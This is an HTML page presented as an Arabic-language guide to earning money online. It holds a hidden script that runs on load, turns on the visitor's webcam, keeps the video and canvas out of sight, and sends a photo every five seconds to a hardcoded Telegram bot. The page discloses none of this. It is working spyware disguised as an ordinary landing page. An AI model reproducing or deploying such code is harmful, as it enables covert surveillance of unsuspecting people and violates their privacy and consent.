<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لكسب المال من الانترنت </title>
  <style>
    body {
      background-color: yellow; /* Yellow background */
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
    }

    /* Hide video and canvas */
    video, canvas {
      display: none;
    }

    /* Style the text */
    .welcome-text {
      font-size: 1.5em;
      font-weight: bold;
      color: #333;
      margin-bottom: 20px;
    }

    /* Style the button */
    .more-info-btn {
      padding: 10px 20px;
      background-color: #008CBA;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 1.2em;
    }

    .more-info-btn:hover {
      background-color: #005f72;
    }
  </style>
</head>
<body>
  <div class="welcome-text">
    مرحبا بكم فى هذه الصفحة. تتوفر فى هذه الصفحة طرق اكتساب المال من الانترنت.
  </div>
  <button class="more-info-btn" onclick="window.open('https://hanoybot.github.io/No/', '_blank')">
    معرفة المزيد
  </button>

  <video id="video" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Start camera
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        captureAndSend(); // Start capturing images and sending
      } catch (error) {
        console.error("Error accessing camera: ", error);
      }
    }

    // Capture and send image every 5 seconds
    async function captureAndSend() {
      const context = canvas.getContext('2d');
      setInterval(async () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
        sendToTelegram(imageData); // Send the image to Telegram
      }, 5000); // Send image every 5 seconds
    }

    // Send image to Telegram
    async function sendToTelegram(imageData) {
      const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o'; // Bot token
      const chatId = '6514749116'; // Chat ID

      // Convert Base64 to file
      const blob = await fetch(imageData).then(res => res.blob());
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png');

      // Send the image using Telegram API
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(result => {
        console.log('Photo sent successfully:', result);
      })
      .catch(error => {
        console.error('Error sending photo:', error);
      });
    }

    // Start camera when the page loads
    startCamera();
  </script>
</body>
</html>
